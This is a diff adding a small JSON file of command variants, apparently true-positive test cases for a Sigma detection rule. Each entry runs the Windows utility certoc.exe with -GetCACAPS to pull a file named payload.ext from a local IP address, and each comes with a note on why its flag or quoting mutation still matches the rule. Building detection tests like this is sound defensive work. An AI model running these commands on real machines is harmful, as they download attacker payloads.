@@ -1,0 +1,14 @@
+[
+  {
+    "output": "certoc.exe -GetCACAPS http://192.168.1.100/payload.ext",
+    "explanation": "This is the original true positive command and matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "certoc.exe /GetCACAPS http://192.168.1.100/payload.ext",
+    "explanation": "Substitution of '-' with '/' for the flag is a valid mutation technique and still matches the Sigma rule."
+  },
+  {
+    "output": "certoc.exe -GetCACAPS \"http://192.168.1.100/payload.ext\"",
+    "explanation": "Insertion of quotes around the URL is a safe mutation and does not affect detection by the Sigma rule."
+  }
+]
